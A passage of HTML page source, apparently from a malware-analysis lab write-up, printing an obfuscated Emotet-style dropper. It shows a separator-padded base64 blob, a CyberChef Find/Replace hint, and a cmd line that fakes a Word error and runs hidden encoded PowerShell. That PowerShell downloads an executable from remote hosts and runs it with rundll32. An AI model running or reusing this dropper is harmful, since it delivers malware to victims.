+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>A[_]D[_]c[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]X[_]w[_]B[_]T[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]T[_]Q[_]B[_]y[_]A[_]G[_]s[_]A[_]a[_]g[_]B[_]j[_]A[_]G[_]k[_]A[_]b[_]Q[_]A[_]9[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]0[_]A[_]Y[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]S[_]A[_]B[_]f[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]6[_]A[_]C[_]8[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]G[_]Q[_]A[_]b[_]
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>g[_]A[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]Y[_]g[_]B[_]h[_]A[_]G[_]4[_]A[_]Z[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]p[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]e[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]A[_]B[_]p[_]A[_]C[_]4[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]Q[_]A[_]a[_]A[_]B[_]t[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]g[_]B[_]p[_]A[_]G[_]
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>w[_]A[_]Z[_]Q[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]v[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]0[_]A[_]e[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]z[_]A[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]y[_]A[_]H[_]k[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]c[_]A[_]a[_]Q[_]B[_]m[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]g[_]B[_]l[_]A[_]H[_]g[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]A[_]A[_]F[_]0[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Y[_]g[_]A[_]
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]I[_]A[_]F[_]8[_]A[_]c[_]w[_]A[_]6[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]v[_]A[_]G[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]w[_]B[_]s[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]4[_]A[_]Y[_]w[_]B[_]v[_]A[_]G[_]0[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]8[_]A[_]
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Q[_]A[_]B[_]d[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]i[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]I[_]A[_]S[_]A[_]B[_]f[_]A[_]H[_]M[_]A[_]O[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]v[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]C[_]8[_]A[_]d[_]w[_]B[_]3[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]3[_]A[_]C[_]4[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]Q[_]B[_]j[_]A[_]
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>H[_]I[_]A[_]Z[_]Q[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]M[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]u[_]A[_]H[_]Q[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]L[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]U[_]A[_]E[_]g[_]A[_]T[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]H[_]A[_]G[_]8[_]A[_]b[_]A[_]B[_]k[_]A[_]G[_]U[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]G[_]k[_]A[_]J[_]w[_]
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]s[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]U[_]A[_]E[_]g[_]A[_]T[_]Q[_]B[_]f[_]A[_]E[_]0[_]A[_]W[_]Q[_]B[_]T[_]A[_]F[_]Q[_]A[_]R[_]Q[_]B[_]S[_]A[_]F[_]k[_]A[_]X[_]w[_]B[_]G[_]A[_]E[_]w[_]A[_]Q[_]Q[_]B[_]H[_]A[_]E[_]A[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]d[_]A[_]G[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>A[_]J[_]w[_]A[_]y[_]A[_]E[_]g[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]X[_]w[_]B[_]z[_]A[_]D[_]o[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]G[_]Q[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]L[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]i[_]A[_]G[_]E[_]A[_]b[_]g[_]B[_]k[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>A[_]H[_]k[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]Q[_]A[_]a[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]V[_]A[_]B[_]I[_]A[_]E[_]0[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]v[_]A[_]G[_]Y[_]A[_]a[_]Q[_]B[_]s[_]A[_]G[_]U[_]A[_]c[_]w[_]A[_]v[_]A[_]G[_]k[_]A[_]b[_]g[_]B[_]k[_]A[_]G[_]U[_]A[_]e[_]A[_]A[_]v[_]A[_]C[_]k[_]A[_]L[_]g[_]A[_]g[_]A[_]C[_]I[_]A[_]c[_]g[_]B[_]F[_]A[_]F[_]A[_]A[_]b[_]A[_]B[_]B[_]A[_]G[_]A[_]A[_]Y[_]
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>w[_]B[_]F[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]X[_]Q[_]B[_]i[_]A[_]D[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]I[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]8[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]L[_]A[_]A[_]o[_]A[_]F[_]s[_]A[_]Y[_]Q[_]B[_]y[_]A[_]H[_]I[_]A[_]Y[_]Q[_]B[_]5[_]A[_]F[_]0[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]M[_]A[_]Z[_]A[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]z[_]A[_]H[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]w[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]g[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>s[_]A[_]J[_]w[_]B[_]0[_]A[_]H[_]A[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]w[_]A[_]J[_]w[_]A[_]z[_]A[_]G[_]Q[_]A[_]J[_]w[_]A[_]p[_]A[_]F[_]s[_]A[_]M[_]Q[_]B[_]d[_]A[_]C[_]k[_]A[_]L[_]g[_]A[_]i[_]A[_]H[_]M[_]A[_]U[_]A[_]B[_]s[_]A[_]G[_]A[_]A[_]S[_]Q[_]B[_]0[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]k[_]A[_]F[_]Q[_]A[_]M[_]g[_]A[_]2[_]A[_]E[_]E[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]2[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]f[_]A[_]E[_]E[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]C[_]A[_]D[_]c[_]A[_]N[_]Q[_]B[_]
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>Q[_]A[_]C[_]k[_]A[_]O[_]w[_]A[_]k[_]A[_]F[_]c[_]A[_]N[_]w[_]A[_]x[_]A[_]F[_]Q[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]Q[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]k[_]A[_]M[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]D[_]s[_]A[_]Z[_]g[_]B[_]v[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]h[_]A[_]G[_]M[_]A[_]a[_]A[_]A[_]g[_]A[_]C[_]g[_]A[_]J[_]A[_]B[_]2[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]f[_]A[_]E[_]I[_]A[_]I[_]A[_]B[_]p[_]A[_]G[_]4[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]0[_]A[_]
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>c[_]g[_]B[_]r[_]A[_]G[_]o[_]A[_]K[_]Q[_]B[_]7[_]A[_]H[_]Q[_]A[_]c[_]g[_]B[_]5[_]A[_]H[_]s[_]A[_]K[_]A[_]A[_]u[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]O[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]w[_]A[_]t[_]A[_]E[_]8[_]A[_]Y[_]g[_]B[_]q[_]A[_]G[_]U[_]A[_]Y[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]g[_]A[_]H[_]M[_]A[_]W[_]Q[_]B[_]z[_]A[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]N[_]A[_]C[_]4[_]A[_]b[_]g[_]B[_]l[_]A[_]H[_]Q[_]A[_]L[_]g[_]B[_]X[_]A[_]E[_]U[_]A[_]Y[_]g[_]B[_]D[_]A[_]
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>E[_]w[_]A[_]a[_]Q[_]B[_]F[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]I[_]g[_]B[_]E[_]A[_]E[_]8[_]A[_]d[_]w[_]B[_]O[_]A[_]E[_]w[_]A[_]b[_]w[_]B[_]B[_]A[_]G[_]Q[_]A[_]Z[_]g[_]B[_]g[_]A[_]E[_]k[_]A[_]Y[_]A[_]B[_]M[_]A[_]G[_]U[_]A[_]I[_]g[_]A[_]o[_]A[_]C[_]Q[_]A[_]d[_]g[_]B[_]h[_]A[_]H[_]I[_]A[_]X[_]w[_]B[_]C[_]A[_]C[_]w[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]M[_]A[_]e[_]Q[_]B[_]n[_]A[_]D[_]A[_]A[_]a[_]w[_]B[_]1[_]A[_]D[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]R[_]w[_]A[_]3[_]A[_]D[_]U[_]A[_]U[_]Q[_]
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]X[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]O[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]f[_]A[_]F[_]I[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]B[_]J[_]A[_]G[_]Y[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]g[_]A[_]o[_]A[_]C[_]c[_]A[_]R[_]w[_]B[_]l[_]A[_]H[_]Q[_]A[_]L[_]Q[_]B[_]J[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]t[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]g[_]A[_]C[_]Q[_]A[_]Q[_]w[_]B[_]5[_]A[_]G[_]c[_]
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>A[_]M[_]A[_]B[_]r[_]A[_]H[_]U[_]A[_]N[_]w[_]A[_]p[_]A[_]C[_]4[_]A[_]I[_]g[_]B[_]s[_]A[_]G[_]A[_]A[_]Z[_]Q[_]B[_]u[_]A[_]G[_]c[_]A[_]d[_]A[_]B[_]o[_]A[_]C[_]I[_]A[_]I[_]A[_]A[_]t[_]A[_]G[_]c[_]A[_]Z[_]Q[_]A[_]g[_]A[_]D[_]M[_]A[_]M[_]A[_]A[_]1[_]A[_]D[_]c[_]A[_]N[_]Q[_]A[_]p[_]A[_]C[_]A[_]A[_]e[_]w[_]A[_]u[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]y[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]U[_]A[_]b[_]g[_]B[_]k[_]A[_]G[_]w[_]A[_]b[_]A[_]A[_]z[_]A[_]D[_]I[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]D[_]
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>A[_]H[_]k[_]A[_]Z[_]w[_]A[_]w[_]A[_]G[_]s[_]A[_]d[_]Q[_]A[_]3[_]A[_]C[_]w[_]A[_]K[_]A[_]A[_]n[_]A[_]E[_]M[_]A[_]b[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]y[_]A[_]G[_]8[_]A[_]b[_]A[_]B[_]f[_]A[_]F[_]I[_]A[_]d[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]E[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]E[_]w[_]A[_]T[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]Q[_]A[_]u[_]A[_]C[_]I[_]A[_]V[_]
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>A[_]B[_]g[_]A[_]G[_]8[_]A[_]c[_]w[_]B[_]U[_]A[_]H[_]I[_]A[_]Y[_]A[_]B[_]J[_]A[_]E[_]4[_]A[_]R[_]w[_]A[_]i[_]A[_]C[_]g[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]Q[_]g[_]A[_]y[_]A[_]D[_]k[_]A[_]R[_]A[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]a[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]N[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]y[_]A[_]F[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]B[_]i[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]h[_]A[_]G[_]s[_]A[_]O[_]w[_]A[_]k[_]A[_]E[_]Y[_]A[_]M[_]g[_]A[_]2[_]A[_]E[_]
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>Y[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]c[_]A[_]V[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]D[_]M[_]A[_]N[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]X[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]H[_]0[_]A[_]f[_]Q[_]B[_]j[_]A[_]G[_]E[_]A[_]d[_]A[_]B[_]j[_]A[_]G[_]g[_]A[_]e[_]w[_]B[_]9[_]A[_]H[_]0[_]A[_]J[_]A[_]B[_]K[_]A[_]D[_]E[_]A[_]X[_]w[_]B[_]O[_]A[_]D[_]0[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]Q[_]A[_]M[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]4[_]A[_]E[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]A[_]=[_]=
+</code></pre></div>
+<p>Replace the <code>[_]</code> characters using the <code>Find/Replace</code> recipe with <code>Find = [\[\]_\n]</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">cmd</span> <span class="n">cmd</span> <span class="n">cmd</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="n">msg</span> <span class="k">%</span><span class="n">username</span><span class="p">%</span> <span class="p">/</span><span class="n">v</span> <span class="n">Word</span> <span class="n">experienced</span> <span class="n">an</span> <span class="n">error</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">open</span> <span class="n">the</span> <span class="n">file</span><span class="p">.</span> <span class="p">&amp;</span> <span class="n">P</span><span class="p">^</span><span class="n">Ow</span><span class="p">^</span><span class="n">er</span><span class="p">^</span><span class="n">she</span><span class="p">^</span><span class="n">L</span><span class="p">^</span><span class="n">L</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-ENCOD</span>  <span class="n">UwBFAFQALQBWAGEAcgBJAEEAQgBsAGUAIAAgADgAaQBoADUANgA3ACAAIAAoACAAIABbAHQAWQBwAGUAXQAoACIAewAzAH0AewAwAH0AewA0AH0AewAyAH0AewAxAH0AIgAtAGYAJwBZAHMAVAAnACwAJwBSAGUAYwBUAE8AUgB5ACcALAAnAE0ALgBpAE8ALgBEAEkAJwAsACcAcwAnACwAJwBlACcAKQApADsAIAAgACAAUwBFAFQALQBJAHQAZQBtACAAKAAiAHYAQQAiACsAIgBSAGkAQQAiACsAIgBiAEwAZQA6AFIAIgArACIAaQAiACsAIgA3AHgATwAzACIAKQAgACgAWwBUAHkAUABlAF0AKAAiAHsAMgB9AHsANQB9AHsANAB9AHsAMwB9AHsAMQB9AHsAMAB9ACIALQBGACAAJwBSACcALAAnAE0AYQBOAGEARwBFACcALAAnAFMAJwAsACcAVgBJAGMARQBQAG8ASQBuAHQAJwAsACcALgBuAGUAVAAuAHMARQByACcALAAnAFkAcwB0AGUAbQAnACkAIAApACAAIAA7ACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACgAJwBTAGkAJwArACgAJwBsAGUAbgAnACsAJwB0ACcAKQArACgAJwBsACcAKwAnAHkAQwBvAG4AdAAnACkAKwAnAGkAJwArACgAJwBuACcAKwAnAHUAZQAnACkAKQA7ACQAdgBhAHIAXwBBAD0AJABQADUAOABCACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABaADEAOQBSADsAJABCADUAMwBOAD0AKAAoACcAUwAnACsAJwA3ADcAJwApACsAJwBIACcAKQA7ACAAIAAoACAAIABsAHMAIAAgAFYAYQByAEkAYQBCAEwARQA6ADgAaQBoADUANgA3ACAAIAApAC4AVgBhAGwAdQBlADoAOgAiAEMAUgBFAEEAdABgAEUAYABEAGAAaQBSAGUAYwBUAE8AcgBZACIAKAAkAEgATwBNAEUAIAArACAAKAAoACgAJwBlAE4ANwBSAHIAJwArACcAMQBzACcAKwAnAGoAOQBhACcAKwAnAGUATgAnACkAKwAnADcAJwArACgAJwBCACcAKwAnAGMAeAAnACkAKwAoACcANABpACcAKwAnAGEAeQBlACcAKQArACcATgA3ACcAKQAuACIAcgBlAFAAYABMAGEAYABjAEUAIgAoACgAWwBDAEgAYQBSAF0AMQAwADEAKwBbAEMASABhAFIAXQA3ADgAKwBbAEMASABhAFIAXQA1ADUAKQAsAEgAXwBUAHIAaQBuAEcAXQBbAEMASABhAFIAXQA5ADIAKQApACkAOwAkAFYANQA3AFIAPQAoACgAJwBCACcAKwAnADQANgAnACkAKwAnAFYAJwApADsAIAAoAHYAYQBSAEkAYQBCAGwAZQAgACgAIgBSACIAKwAiAGkAIgArACIANwB4AE8AMwAiACkAIAApAC4AVgBBAGwAVQBFADoAOgAiAFMAZQBDAHUAcgBJAGAAVABgAHkAUABgAFIATwBgAFQAbwBDAE8ATAAiACAAPQAgACgAKAAnAFQAJwArACcAbABzACcAKQArACcAMQAyACcAKQA7ACQAWAA0ADQAUwA9ACgAJwBTADgAJwArACcAMQBEACcAKQA7ACQAUABhADIAbgB1AHIANAAgAD0AIAAoACcASwAnACsAKAAnAF8AOQAnACsAJwBPACcAKQApADsAJABPADYANgBHAD0AKAAoACcARgA4ACcAKwAnADgAJwApACsAJwBXACcAKQA7ACQAQwB5AGcAMABrAHUANwA9ACQASABPAE0ARQArACgAKAAoACcAZQBBAHcAUgAnACsAJwByACcAKQArACgAJwAxACcAKwAnAHMAagA5AGEAZQBBACcAKQArACgAJwB3ACcAKwAnAEIAYwB4ACcAKQArACgAJwA0AGkAYQAnACsAJwB5ACcAKwAnAGUAQQAnACkAKwAnAHcAJwApACAALQByAGUAcABMAEEAQwBlACgAJwBlAEEAJwArACcAdwAnACkALABbAGMAaABhAFIAXQA5ADIAKQArACQAUABhADIAbgB1AHIANAArACgAJwAuAGQAJwArACcAbABsACcAKQA7ACQARQAwADEAQgA9ACgAJwBSADcAJwArACcAXwBTACcAKQA7ACQATQByAGsAagBjAGkAbQA9ACgAKAAnAF0AYgAnACsAJwAyACcAKQArACcASABfACcAKwAoACcAcwA6AC8ALwAnACsAJwBjAGQAbgAuACcAKQArACcAYgBhAG4AZAAnACsAJwBpACcAKwAnAHQAJwArACcAeQAnACsAKAAnAGUAJwArACcAdABpAC4AJwApACsAKAAnAHQAaABtAC8AJwArACcAZgBpAGwAZQBzACcAKQArACgAJwAvACcAKwAnAG0AeQAnACsAJwBzAHQAZQByAHkAJwApACsAKAAnAGcAaQBmAHQAJwArACcALgBlAHgAZQAnACsAJwBAAF0AJwArACcAYgAyACcAKQArACgAJwBIAF8AcwA6AC8AJwArACcALwAnACkAKwAoACcAZwAnACsAJwBvAG8AJwArACcAZwBsAGUAJwApACsAKAAnAC4AYwBvAG0AJwApACsAKAAnAC8AJwArACcAQABdACcAKQArACgAJwBiACcAKwAnADIASABfAHMAOgAnACsAJwAvACcAKwAnAC8AdwB3ACcAKQArACgAJwB3AC4AJwArACcAcwAnACkAKwAoACcAZQBjAHIAZQB0ACcAKwAnAFMAYQAnACsAJwBuAHQAYQAnACkAKwAoACcALgAnACsAJwBUAEgATQAnACkAKwAnAC8AJwArACgAJwBHAG8AbABkAGUAbgAnACsAJwB0AGkAJwApACsAJwBjACcAKwAnAGsAJwArACgAJwBlAHQAJwArACcALwAnACsAJwBUAEgATQBfAE0AWQBTAFQARQBSAFkAXwBGAEwAQQBHAEAAJwApACsAJwBdAGIAJwArACgAJwAyAEgAJwArACcAXwBzADoAJwApACsAKAAnAC8AJwArACcALwAnACsAJwBjAGQAbgAnACkAKwAoACcALgAnACsAJwBiAGEAbgBkACcAKwAnAGkAJwApACsAJwB0AHkAZQAnACsAKAAnAHQAaQAnACsAJwAuACcAKQArACcAVABIAE0AJwArACgAJwAvAGYAaQBsAGUAcwAvAGkAbgBkAGUAeAAvACkALgAgACIAcgBFAFAAbABBAGAAYwBFACIAKAAoACcAXQBiADIAJwArACgAJwBIACcAKwAnAF8AJwApACkALAAoAFsAYQByAHIAYQB5AF0AKAAnAHMAZAAnACwAJwBzAHcAJwApACwAKAAnAGgAdAAnACsAJwB0AHAAJwApACwAJwAzAGQAJwApAFsAMQBdACkALgAiAHMAUABsAGAASQB0ACIAKAAkAFQAMgA2AEEAIAArACAAJAB2AGEAcgBfAEEAIAArACAAJABCADcANQBQACkAOwAkAFcANwAxAFQAPQAoACgAJwBQACcAKwAnADkAMwAnACkAKwAnAFgAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJAB2AGEAcgBfAEIAIABpAG4AIAAkAE0AcgBrAGoAKQB7AHQAcgB5AHsAKAAuACgAJwBOAGUAJwArACcAdwAtAE8AYgBqAGUAYwAnACsAJwB0ACcAKQAgAHMAWQBzAHQAZQBNAC4AbgBlAHQALgBXAEUAYgBDAEwAaQBFAG4AdAApAC4AIgBEAE8AdwBOAEwAbwBBAGQAZgBgAEkAYABMAGUAIgAoACQAdgBhAHIAXwBCACwAIAAkAEMAeQBnADAAawB1ADcAKQA7ACQARwA3ADUAUQA9ACgAJwBXACcAKwAoACcAOAAnACsAJwBfAFIAJwApACkAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQBJAHQAJwArACcAZQAnACsAJwBtACcAKQAgACQAQwB5AGcAMABrAHUANwApAC4AIgBsAGAAZQBuAGcAdABoACIAIAAtAGcAZQAgADMAMAA1ADcANQApACAAewAuACgAJwByACcAKwAnAHUAbgBkAGwAbAAzADIAJwApACAAJABDAHkAZwAwAGsAdQA3ACwAKAAnAEMAbwAnACsAKAAnAG4AdAAnACsAJwByAG8AbABfAFIAdQAnACsAJwBuACcAKQArACgAJwBEACcAKwAnAEwATAAnACkAKQAuACIAVABgAG8AcwBUAHIAYABJAE4ARwAiACgAKQA7ACQAQgAyADkARAA9ACgAJwBaACcAKwAoACcANgAnACsAJwAyAFcAJwApACkAOwBiAHIAZQBhAGsAOwAkAEYAMgA